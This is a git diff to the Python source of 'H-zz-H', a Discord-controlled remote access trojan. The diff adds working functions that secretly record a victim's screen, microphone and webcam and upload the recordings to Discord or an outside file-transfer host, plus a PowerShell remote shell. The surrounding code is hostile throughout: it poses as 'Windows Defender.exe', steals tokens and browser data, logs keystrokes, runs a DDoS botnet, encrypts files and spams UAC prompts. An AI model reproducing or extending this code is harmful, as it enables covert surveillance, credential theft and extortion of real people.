@@ -23,13 +23,17 @@ import pyaes
 import tkinter as tk
 import winreg as reg
 import glob
+import wave
+import sqlite3
+import numpy as np
+import sounddevice as sd
 from pynput import keyboard
 from urllib3 import PoolManager, HTTPResponse
 from ctypes import *
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, init
 from discord.ext import commands
-from PIL import Image, ImageTk
+from PIL import Image, ImageTk, ImageGrab
 from win32crypt import CryptUnprotectData
 
 os.system("@echo off")
@@ -143,7 +147,7 @@ intents.message_content = True
 # Love y’all. Bye.  
 # ~~~ H-zz-H ~~~  
 
-HzzH = "your bot token here" # Put ur bot token here
+HzzH = "" # Put ur bot token here
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Change the "!" to whatever prefix you want
 
 # DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING
@@ -159,7 +163,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Cha
 script_path = os.path.realpath(sys.argv[0])
 autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')
-temp_folder = os.getenv('TEMP')
+temp_folder = os.environ['TEMP']
 file_name = "Windows Defender.exe"
 hzzh_path1 = os.path.join(temp_folder, file_name)
 log_file_path = os.path.join(temp_folder, "hzzh.txt")
@@ -167,33 +171,12 @@ keylog_listener = None
 key_log = []
 ACTIVE_PCS_FILE = os.path.join(os.environ['TEMP'], "active_pcs.txt")
 FLOATING_WINDOW = None
-SAVE_PATH = os.environ['TEMP']
 httpClient = PoolManager(cert_reqs="CERT_NONE")
-ROAMING = os.getenv("appdata")
+APPDATA = os.getenv("appdata")
 LOCALAPPDATA = os.getenv("localappdata")
 REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
 REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
-temp_folder = os.environ['TEMP'] 
 current_directory = os.getcwd()
-
-if not os.path.exists(ACTIVE_PCS_FILE):
-    with open(ACTIVE_PCS_FILE, "w") as f:
-        pass
-
-def get_active_pcs():
-    with open(ACTIVE_PCS_FILE, "r") as f:
-        return set(line.strip() for line in f.readlines())
-active_pcs = get_active_pcs()
-def add_active_pc(pc_name):
-    with open(ACTIVE_PCS_FILE, "a") as f:
-        f.write(f"{pc_name}\n")
-
-def remove_active_pc(pc_name):
-    active_pcs = get_active_pcs()
-    active_pcs.discard(pc_name)
-    with open(ACTIVE_PCS_FILE, "w") as f:
-        for pc in active_pcs:
-            f.write(f"{pc}\n")
 
 def get_system_info():
     try:
@@ -354,8 +337,8 @@ def move_window_randomly(root):
     root.after(random.randint(500, 2000), move_window_randomly, root)
 
 def download_image(image_url):
-    if not os.path.exists(SAVE_PATH):
-        os.makedirs(SAVE_PATH)
+    if not os.path.exists(temp_folder):
+        os.makedirs(temp_folder)
 
     response = requests.get(image_url, stream=True)
     if response.status_code != 200:
@@ -367,7 +350,7 @@ def download_image(image_url):
     if file_extension not in valid_extensions:
         file_extension = "png"
 
-    file_path = os.path.join(SAVE_PATH, f"floating_image.{file_extension}")
+    file_path = os.path.join(temp_folder, f"floating_image.{file_extension}")
 
     with open(file_path, 'wb') as file:
         for chunk in response.iter_content(1024):
@@ -381,7 +364,7 @@ def download_image(image_url):
         raise Exception(f"Downloaded file is not a valid image: {e}")
 
     if file_extension == "webp":
-        converted_path = os.path.join(SAVE_PATH, "floating_image.png")
+        converted_path = os.path.join(temp_folder, "floating_image.png")
         try:
             with Image.open(file_path) as img:
                 img.convert("RGBA").save(converted_path, "PNG")
@@ -435,6 +418,9 @@ async def on_ready():
     system_info = get_system_info()
     pc_name = system_info.get("PC Name", "Unknown-PC")
 
+    activity = discord.Activity(type=discord.ActivityType.watching, name="on random kids | !help")
+    await bot.change_presence(status=discord.Status.online, activity=activity)
+
     existing_channel = discord.utils.get(guild.channels, name=pc_name.lower())
     if existing_channel:
         print(f"Channel for {pc_name} already exists.")
@@ -469,10 +455,6 @@ async def on_ready():
         except Exception as e:
             print(f"Failed to create channel for {pc_name}: {e}")
 
-    if pc_name not in active_pcs:
-        add_active_pc(pc_name)
-        active_pcs.add(pc_name)
-
 @bot.event
 async def on_message(message):
     if message.author == bot.user:
@@ -494,7 +476,7 @@ async def on_message(message):
         if not (message.content.startswith("!botnet") or message.content.startswith("!botnet_stop") or message.content.startswith("!help") or message.content.startswith("!recreate") or message.content.startswith("!purge")): 
             embed = discord.Embed(
                 title="⚡ Botnet",
-                description="⚡ Please only use !botnet commands here!",
+                description=f"⚡ Please only use !botnet commands here! | Send by: #{pc_name.lower()}",
                 color=0xFFDD00
             )
             await message.channel.send(embed=embed)
@@ -679,12 +661,12 @@ def FireFoxSteal(path: str) -> list[str]:
 
 def get_paths():
     return {
-        "Discord": os.path.join(ROAMING, "discord"),
-        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
-        "Lightcord": os.path.join(ROAMING, "Lightcord"),
-        "Discord PTB": os.path.join(ROAMING, "discordptb"),
-        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
-        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
+        "Discord": os.path.join(APPDATA, "discord"),
+        "Discord Canary": os.path.join(APPDATA, "discordcanary"),
+        "Lightcord": os.path.join(APPDATA, "Lightcord"),
+        "Discord PTB": os.path.join(APPDATA, "discordptb"),
+        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
+        "Opera GX": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
         "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
         "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
         "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
@@ -695,7 +677,7 @@ def get_paths():
         "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
         "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
         "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
-        "FireFox": os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
+        "FireFox": os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
         "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
         "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
         "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
@@ -731,6 +713,119 @@ async def tokenoutput(ctx):
         
         return embed
 
+def record_screen(duration_sec):
+    SCREEN_SIZE = (1920, 1080)
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    video_path = os.path.join(temp_folder, "screen_output.avi")
+    out = cv2.VideoWriter(video_path, fourcc, 20.0, SCREEN_SIZE)
+
+    start_time = time.time()
+    while time.time() - start_time < duration_sec:
+        img = ImageGrab.grab(bbox=(0, 0, SCREEN_SIZE[0], SCREEN_SIZE[1]))
+        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+        out.write(frame)
+
+    out.release()
+    return video_path
+
+def record_audio(duration_sec):
+    fs = 44100
+    audio_path = os.path.join(temp_folder, "audio_output.wav")
+
+    devices = sd.query_devices()
+    input_device = sd.default.device[0]
+
+    print(f"Available Devices: {devices}")
+    print(f"Using device: {input_device}")
+    
+    num_channels = sd.query_devices(input_device)['max_input_channels']
+
+    if num_channels < 1:
+        raise ValueError("No input channels available on the system")
+
+    recording = sd.rec(int(duration_sec * fs), samplerate=fs, channels=num_channels)
+    sd.wait()
+
+    with wave.open(audio_path, 'wb') as wf:
+        wf.setnchannels(num_channels)
+        wf.setsampwidth(2)
+        wf.setframerate(fs)
+        wf.writeframes(recording.tobytes())
+    
+    return audio_path
+
+def record_webcam(duration_sec):
+    cap = cv2.VideoCapture(0)
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    video_path = os.path.join(temp_folder, "webcam_output.mp4")
+    frame_rate = 20.0
+    out = cv2.VideoWriter(video_path, fourcc, frame_rate, (640, 480))
+
+    total_frames = int(duration_sec * frame_rate)
+    for _ in range(total_frames):
+        ret, frame = cap.read()
+        if not ret:
+            break
+        out.write(frame)
+
+    cap.release()
+    out.release()
+    return video_path
+
+async def send_file(ctx, file_path):
+    file_size = os.stat(file_path).st_size
+
+    if file_size > 10485760:
+        embed = discord.Embed(
+                    title="▶ Uploading to External Service",
+                    description=f"This file is over 10MB, uploading to external service. Please wait...",
+                    color=0x00FF00
+                )
+        await ctx.send(embed=embed)
+
+        try:
+            external_api_url = "https://transfer.whalebone.io/"
+            filename = os.path.basename(file_path)
+
+            with open(file_path, 'rb') as file:
+                headers = {
+                    "Max-Downloads": "1",  
+                    "Max-Days": "5"        
+                }
+
+                response = requests.put(external_api_url + filename, data=file, headers=headers)
+
+            if response.status_code == 200:
+                uploaded_file_url = response.text
+
+                embed = discord.Embed(
+                    title="✅ File Uploaded Successfully",
+                    description=f"Your file has been uploaded! You can access it here: {uploaded_file_url}",
+                    color=0x00FF00
+                )
+                await ctx.send(embed=embed)
+            else:
+                embed = discord.Embed(
+                    title="❌ Upload Failed",
+                    description=f"Failed to upload the file. API Response: {response.text}",
+                    color=0xFF0000
+                )
+                await ctx.send(embed=embed)
+
+        except Exception as e:
+            embed = discord.Embed(
+                title="Error",
+                description=f"An error occurred during upload: {str(e)}",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+
+    else:
+        file = discord.File(file_path, filename=os.path.basename(file_path))
+        await ctx.send("Recording complete!", file=file)
+
+    os.remove(file_path)
+
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
@@ -754,10 +849,11 @@ async def help(ctx):
     embed.add_field(name="!fakecmd (amount)", value="Quick flashes (amount) CMD's 💻", inline=False)
     embed.add_field(name="!cmdspam", value="Quickly spams CMD's until System crashes 💻", inline=False)
     embed.add_field(name="!command (command)", value="Executes the given Command 💻", inline=False)
-    embed.add_field(name="!running", value="On how many PC's is it running rn 🌍", inline=False)
+    embed.add_field(name="!shell (command)", value="Executes the given Command (in powershell) 💻", inline=False)
+    embed.add_field(name="!taskkill", value="Find programs with !tasks 🕳", inline=False)
+    # embed.add_field(name="!running", value="On how many PC's is it running rn 🌍", inline=False)
     embed.add_field(name="!botnet (url)", value="Start a DDOS attack on a specific Server ⚡", inline=False)
     embed.add_field(name="!botnet_stop", value="Stops the DDOS attack ⚡", inline=False)
-    embed.add_field(name="!startup", value="Puts H-zz-H in Startups using 5 different unknown Methods 🐀", inline=False)
     embed.add_field(name="!error (Title) | (Text)", value="Displays a fake error Message ⚠️", inline=False)
     embed.add_field(name="!shutdown", value="Shutdowns Victims PC 🛑", inline=False)
     embed.add_field(name="!restart", value="Restarts Victims PC 🔄", inline=False)
@@ -771,6 +867,7 @@ async def help(ctx):
     embed1.add_field(name="!download (file/path)", value="Download a file from Victims PC (10MB)📥", inline=False)
     embed1.add_field(name="!download_ext (file.png)", value="Download a file from Victims PC (100MB)📥", inline=False)
     embed1.add_field(name="!upload (attachment) (!path!)", value="Upload a file to Victims PC 📤", inline=False)
+    embed1.add_field(name="!startup", value="Puts H-zz-H in Startups using 5 different unknown Methods 🐀", inline=False)
     embed1.add_field(name="!admin", value="Checks for admin Permissions 🛠️", inline=False)
     embed1.add_field(name="!wallpaper (attachment.png)", value="Change wallpaper of Victim 🖼️", inline=False)
     embed1.add_field(name="!clipboard", value="Show Clipboard of the Victim 📋", inline=False)
@@ -780,6 +877,9 @@ async def help(ctx):
     embed1.add_field(name="!keylog_dump", value="Sends the recorded keystrokes (first need to stop keylogger) ⌨", inline=False)
     embed1.add_field(name="!keylog_stop", value="Stops capturing keystrokes ⌨", inline=False)
     embed1.add_field(name="!encrypt (*) or (file.extension)", value="Changes (all) Files in directory to .hzzh ⚽", inline=False)
+    embed1.add_field(name="!recscreen (sec)", value="Records the screen for a specific number of seconds 🖼️📷", inline=False)
+    embed1.add_field(name="!recaudio (sec)", value="Records audio for a specific number of seconds 🎤📷", inline=False)
+    embed1.add_field(name="!recwebcam (sec)", value="Records webcam for a specific number of seconds 📷📷", inline=False)
     embed1.add_field(name="!tokens", value="Get Discord Tokens 🎁", inline=False)
     embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
     embed1.add_field(name="", value="", inline=False)
@@ -789,15 +889,16 @@ async def help(ctx):
     embed1.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
     embed1.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
     embed1.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
-    embed1.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
-    embed1.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
-    embed1.add_field(name="!uncritproc", value="Removes the critical process. 🆙", inline=False)
-    embed1.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
+
     await ctx.send(embed=embed1)
 
     embed2 = discord.Embed(
         color=0x00ff00 
     )
+    embed2.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
+    embed2.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
+    embed2.add_field(name="!uncritproc", value="Removes the critical process. 🆙", inline=False)
+    embed2.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
     embed2.add_field(name="", value="", inline=False)
     embed2.add_field(name="", value="**Troll Features:**", inline=False)
     embed2.add_field(name="!floatpic (seconds) (url)", value="Creates an floating unclosable image for (seconds)", inline=False)
@@ -810,6 +911,101 @@ async def help(ctx):
     embed2.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
 
     await ctx.send(embed=embed2)
+
+@bot.command()
+async def taskkill(ctx, process: str):
+    try:
+        found = False
+        for proc in psutil.process_iter(['pid', 'name']):
+            if process.lower() in proc.info['name'].lower():
+                proc_instance = psutil.Process(proc.info['pid'])
+                proc_instance.terminate() 
+                found = True
+
+        if found:
+            embed = discord.Embed(
+                title="🛑 Process Terminated",
+                description=f"Successfully attempted to kill all instances of `{process}`.",
+                color=0x00ff00
+            )
+        else:
+            embed = discord.Embed(
+                title="❌ Process Not Found",
+                description=f"No running process found named: `{process}`.",
+                color=0xff0000
+            )
+
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Error",
+            description=f"An error occurred: `{str(e)}`",
+            color=0xffa500
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def recscreen(ctx, duration: int):
+    await ctx.send(f"Recording screen for {duration} seconds...")
+    video_file = record_screen(duration)
+    await send_file(ctx, video_file)
+
+@bot.command()
+async def recaudio(ctx, duration: int):
+    await ctx.send(f"Recording audio for {duration} seconds...")
+    audio_file = record_audio(duration)
+    await send_file(ctx, audio_file)
+
+@bot.command()
+async def recwebcam(ctx, duration: int):
+    await ctx.send(f"Recording webcam for {duration} seconds...")
+    webcam_file = record_webcam(duration)
+    await send_file(ctx, webcam_file)
+
+@bot.command()
+async def shell(ctx, *, cmd: str):
+    try:
+        process = subprocess.Popen(
+            ["powershell.exe", "-Command", cmd], 
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        stdout, stderr = process.communicate()
+
+        if process.returncode == 0:
+            output = stdout
+        else:
+            output = stderr
+
+        if len(output) > 2000:
+            temp_file_path = os.path.join(temp_folder, "command_output.txt")
+
+            with open(temp_file_path, "w", encoding="utf-8") as f:
+                f.write(output)
+
+            await ctx.send(
+                content="The output was too long, so it has been saved to a file. You can download it below:",
+                file=discord.File(temp_file_path)
+            )
+        else:
+            embed = discord.Embed(
+                title="💻 Command Output",
+                description=f"Executed command: `{cmd}`",
+                color=0x00ff00
+            )
+            embed.add_field(name="Output", value=output, inline=False)
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Command Error",
+            description=f"An error occurred while executing the command: {str(e)}",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
 
 def write_to_file(keys):
     with open(log_file_path, 'a') as file:
@@ -1504,11 +1700,14 @@ async def floatpic(ctx, seconds: int, image_url: str):
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
+import subprocess
+
 @bot.command()
 async def exec(ctx, path: str):
     try:
+        path = path.replace("\\", "\\\\")
         if path.endswith('.exe'):
-            subprocess.run([path], check=True)
+            subprocess.run(['cmd', '/c', 'start', path], check=True)
             embed = discord.Embed(
                 title="✅ File Executed Successfully",
                 description=f"Executable file '{path}' has been run.",
@@ -1516,7 +1715,7 @@ async def exec(ctx, path: str):
             )
             await ctx.send(embed=embed)
         
-        elif path.endswith(('.png', '.jpg', '.jpeg', '.gif')): 
+        elif path.endswith(('.png', '.jpg', '.jpeg', '.gif')):
             subprocess.run(['start', path], check=True, shell=True)
             embed = discord.Embed(
                 title="✅ File Opened Successfully",
@@ -1541,11 +1740,12 @@ async def exec(ctx, path: str):
         )
         await ctx.send(embed=embed)
 
+
 @bot.command()
 async def upload(ctx, path: str = None):
     try:
         if not path:
-            path = os.environ['TEMP'] 
+            path = temp_folder
 
         if ctx.message.attachments:
             attachment = ctx.message.attachments[0]
@@ -1723,8 +1923,6 @@ async def wallpaper(ctx):
         if len(ctx.message.attachments) > 0:  
             attachment = ctx.message.attachments[0]
             image_url = attachment.url
-
-            temp_folder = os.environ['TEMP']
             image_path = os.path.join(temp_folder, "wallpaper.jpg")
 
             response = requests.get(image_url)
@@ -1745,15 +1943,6 @@ async def wallpaper(ctx):
 
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
-
-@bot.command()
-async def browser(ctx):
-    embed = discord.Embed(
-        title="🔍 Browser Passwords",
-        description=f"🔍 ",
-        color=0x00ff00
-    )
-    await ctx.send(embed=embed)
 
 @bot.command()
 async def publicip(ctx):
@@ -1806,16 +1995,19 @@ async def restart(ctx):
             subprocess.run(["sudo", "shutdown", "-r", "now"], check=True)  
     except Exception as e:
         await ctx.send(f"❌ Error: {e}")
-
 @bot.command()
 async def command(ctx, *, cmd: str):
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        process = subprocess.Popen(
+            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
 
-        if result.returncode == 0:
-            output = result.stdout
+        stdout, stderr = process.communicate()
+
+        if process.returncode == 0:
+            output = stdout
         else:
-            output = result.stderr
+            output = stderr
 
         if len(output) > 2000:
             temp_file_path = os.path.join(temp_folder, "command_output.txt")
@@ -1824,7 +2016,7 @@ async def command(ctx, *, cmd: str):
                 f.write(output)
 
             await ctx.send(
-                content=f"The output was too long, so it has been saved to a file. You can download it below:",
+                content="The output was too long, so it has been saved to a file. You can download it below:",
                 file=discord.File(temp_file_path)
             )
         else:
@@ -2004,19 +2196,9 @@ async def startup(ctx):
     await ctx.send(embed=embed)
 
 @bot.command()
-async def running(ctx):
-    number_of_active_pcs = len(active_pcs)
-    embed = discord.Embed(
-        title="🖥️ Running",
-        description=f"🖥️ Currently, there are {number_of_active_pcs} unique PCs running the script!",
-        color=0x00ff00
-    )
-    await ctx.send(embed=embed)
-
-@bot.command()
 async def screen(ctx):
     try:
-        file_path = os.path.join(os.environ['TEMP'], "hzzh.png")
+        file_path = os.path.join(temp_folder, "hzzh.png")
         screenshot = pyautogui.screenshot()
         screenshot.save(file_path)
 
@@ -2206,7 +2388,6 @@ async def battery(ctx):
 async def webcam(ctx):
     try:
         webcam_images = []
-        temp_folder = os.environ['TEMP']
 
         for cam_index in range(10):
             webcam = cv2.VideoCapture(cam_index)
@@ -2242,7 +2423,7 @@ async def webcam(ctx):
 async def tasks(ctx):
     tasks_info = get_running_tasks()
     
-    file_path = os.path.join(os.environ['TEMP'], "tasks_list.txt")
+    file_path = os.path.join(temp_folder, "tasks_list.txt")
     
     with open(file_path, "w") as file:
         file.write("\n".join(tasks_info))
